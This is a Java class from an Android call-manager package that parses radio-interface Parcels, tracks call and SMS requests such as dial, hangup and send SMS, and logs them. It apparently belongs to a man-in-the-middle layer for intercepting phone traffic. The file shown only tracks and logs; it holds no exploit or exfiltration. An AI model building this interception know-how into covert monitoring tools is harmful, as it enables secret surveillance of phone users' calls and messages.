package com.vvt.callmanager.std;

import java.util.ArrayList;

import android.os.Parcel;

import com.vvt.callmanager.mitm.AtLogCollector;
import com.vvt.callmanager.ref.Customization;
import com.vvt.logger.FxLog;

public class RilManager {
	
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	
	private static final int RESPONSE_SOLICITED = 0;
    private static final int RESPONSE_UNSOLICITED = 1;
    
    private ArrayList<RilRequest> mRequestsList;
    private AtLogCollector mAtLogCollector;
    
    private String mTag;
    private boolean mShowLog;
    private boolean mCollectLog;
    
    public RilManager(String tag, boolean showLog, boolean collectLog) {
    	mTag = tag;
    	mShowLog = showLog;
    	mCollectLog = collectLog;
    	mRequestsList = new ArrayList<RilRequest>();
    }
    
    public void setAtLogCollector(AtLogCollector atLogCollector) {
    	mAtLogCollector = atLogCollector;
    }
    
    public AtLogCollector getAtLogCollector() {
    	return mAtLogCollector;
    }
    
    public ArrayList<RilRequest> getRequestList() {
    	return mRequestsList;
    }
	
	public void writeDebugLog(String message) {
		if (mShowLog || LOGD) FxLog.d(mTag, message);
		if (mCollectLog && mAtLogCollector != null) {
			mAtLogCollector.append(message);
		}
	}
	
	public void writeAtMessage(String message) {
		if (mShowLog) FxLog.v(mTag, message);
		if (mCollectLog && mAtLogCollector != null) {
			mAtLogCollector.append(message);
		}
	}
    
    public void addRequest(Parcel p) {
		p.setDataPosition(4);
		int request = p.readInt();
		int serial = p.readInt();
		p.setDataPosition(0);
		
		mRequestsList.add(RilRequest.obtain(request, serial));
		if (mShowLog && LOGV) {
			FxLog.v(mTag, String.format(
					"Request(%d): %d is added", serial, request));
		}
		
		displayRequest(request);
	}
	
	/**
	 * Every processRequest method (in each state) should call to this function, 
	 * so we will never miss capturing the serial of some important request
	 * @param p
	 * @return
	 */
	public int getRequest(Parcel p) {
		p.setDataPosition(4);
		int request = p.readInt();
		p.setDataPosition(0);
		
		switch (request) {
			case RilConstant.RIL_REQUEST_ANSWER:
			case RilConstant.RIL_REQUEST_CDMA_FLASH:
			case RilConstant.RIL_REQUEST_CONFERENCE:
			case RilConstant.RIL_REQUEST_DIAL:
			case RilConstant.RIL_REQUEST_GET_CURRENT_CALLS:
			case RilConstant.RIL_REQUEST_SWITCH_CALLS:
			case RilConstant.RIL_REQUEST_HANGUP:
			case RilConstant.RIL_REQUEST_HANGUP_BACKGROUND:
			case RilConstant.RIL_REQUEST_HANGUP_FOREGROUND:
			case RilConstant.RIL_REQUEST_HANGUP_LG:
			case RilConstant.RIL_REQUEST_SEND_SMS:
			case RilConstant.RIL_REQUEST_SEND_SMS_EXPECT_MORE:
			case RilConstant.RIL_REQUEST_SMS_ACKNOWLEDGE:
			case RilConstant.RIL_REQUEST_CDMA_SMS_ACKNOWLEDGE:
				addRequest(p);
				break;
		}
		
		return request;
	}
	
	/**
	 * Every processResponse method (in each state) should call to this function, 
	 * so we can maintain the size of mRequestList
	 * @param p
	 * @return
	 */
	public int getResponse(Parcel p) {
		int response = -1;
		Response r = Response.obtain(p);
		if (r.type == RESPONSE_UNSOLICITED) {
			response = r.number;
		}
		else {
			RilRequest rr = findAndRemoveRequestFromList(p);
			if (rr != null) {
				response = rr.request;
			}
		}
		
		displayResponse(response);
		
		return response;
	}
	
	/**
	 * Should only be called from getResponse()
	 * @param p
	 * @return
	 */
	private RilRequest findAndRemoveRequestFromList(Parcel p) {
		Response r = Response.obtain(p);
		if (r.type == RESPONSE_SOLICITED) {
			RilRequest rr = null;
			for (int i = 0, s = mRequestsList.size() ; i < s ; i++) {
                rr = mRequestsList.get(i);
                if (rr.serial == r.number) {
                    mRequestsList.remove(i);
                    
                    if (LOGV) FxLog.v(mTag, String.format(
                    		"Receive response for serial: %d, request: %d", 
                    		rr.serial, rr.request));
                    return rr;
                }
            }
		}
		return null;
	}

	/**
	 * Now primarily support CDMA
	 * @param code
	 */
	private void displayRequest(int code) {
		String message = null;
		switch (code) {
			case RilConstant.RIL_REQUEST_ANSWER:
				message = "Answer";
				break;
			case RilConstant.RIL_REQUEST_CDMA_FLASH:
				message = "Flash";
				break;
			case RilConstant.RIL_REQUEST_CONFERENCE:
				message = "Merge";
				break;
			case RilConstant.RIL_REQUEST_DIAL:
				message = "Dial";
				break;
			case RilConstant.RIL_REQUEST_GET_CURRENT_CALLS:
				message = "Get Current Calls";
				break;
			case RilConstant.RIL_REQUEST_SWITCH_CALLS:
				message = "Switch";
				break;
			case RilConstant.RIL_REQUEST_SET_MUTE:
				message = "Set Mute";
				break;
			case RilConstant.RIL_REQUEST_HANGUP:
				message = "Hangup";
				break;
			case RilConstant.RIL_REQUEST_HANGUP_BACKGROUND:
				message = "Hangup Background";
				break;
			case RilConstant.RIL_REQUEST_HANGUP_FOREGROUND:
				message = "Hangup Foreground";
				break;
			case RilConstant.RIL_REQUEST_HANGUP_LG:
				message = "Hangup LG";
				break;
			case RilConstant.RIL_REQUEST_SEND_SMS:
				message = "Send SMS";
				break;
			case RilConstant.RIL_REQUEST_SEND_SMS_EXPECT_MORE:
				message = "Send SMS and Expect More";
				break;
			case RilConstant.RIL_REQUEST_SMS_ACKNOWLEDGE:
			case RilConstant.RIL_REQUEST_CDMA_SMS_ACKNOWLEDGE:
				message = "SMS Acknowledge";
				break;
		}
		if (message != null) {
			writeAtMessage(String.format("--- %s ---", message));
		}
	}

	/**
	 * Now primarily support CDMA
	 * @param code
	 */
	private void displayResponse(int code) {
		String message = null;
		switch (code) {
			case RilConstant.RIL_UNSOL_CALL_STATE_CHANGED:
				message = "Call State Changed";
				break;
			case RilConstant.RIL_UNSOL_LG_CALL_STATE_INFO:
				message = "LG Call State Info";
				break;
			case RilConstant.RIL_UNSOL_CDMA_CALL_WAITING:
				message = "Call Waiting";
				break;
			case RilConstant.RIL_UNSOL_CALL_RING:
			case RilConstant.RIL_UNSOL_HTC_CALL_RING:
				message = "Call Ring";
				break;
			case RilConstant.RIL_UNSOL_NEW_SMS:
			case RilConstant.RIL_UNSOL_CDMA_NEW_SMS:
				message = "New SMS";
				break;
			case RilConstant.RIL_REQUEST_ANSWER:
				message = "Answering Responded";
				break;
			case RilConstant.RIL_REQUEST_SET_MUTE:
				message = "Set Mute Responded";
				break;
			case RilConstant.RIL_REQUEST_HANGUP:
			case RilConstant.RIL_REQUEST_HANGUP_BACKGROUND:
			case RilConstant.RIL_REQUEST_HANGUP_FOREGROUND:
			case RilConstant.RIL_REQUEST_HANGUP_LG:
				message = "Hangup Responded";
				break;
			case RilConstant.RIL_REQUEST_SEND_SMS:
				message = "Send SMS Responded";
				break;
			case RilConstant.RIL_REQUEST_SEND_SMS_EXPECT_MORE:
				message = "Send SMS and Expect More Responded";
				break;
			case RilConstant.RIL_REQUEST_SMS_ACKNOWLEDGE:
			case RilConstant.RIL_REQUEST_CDMA_SMS_ACKNOWLEDGE:
				message = "SMS Acknowledge Responded";
				break;
		}
		if (message != null) {
			writeAtMessage(String.format("--- %s ---", message));
		}
	}
}
